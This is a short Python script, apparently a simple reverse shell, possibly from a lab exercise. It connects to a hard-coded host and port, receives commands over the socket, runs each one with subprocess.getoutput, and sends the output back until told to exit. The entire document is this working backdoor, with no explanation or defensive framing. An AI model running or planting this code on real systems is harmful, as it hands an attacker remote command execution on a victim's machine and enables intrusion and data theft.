import socket
import subprocess


ip = '192.168.86.129'
port = 1234

buffer_size = 2048

s = socket.socket()
s.connect((ip, port))

print(s.recv(buffer_size).decode())

while True:
    command = s.recv(buffer_size).decode()

    if command == 'exit':
        break

    output = subprocess.getoutput(command)
    s.send(output.encode())

s.close()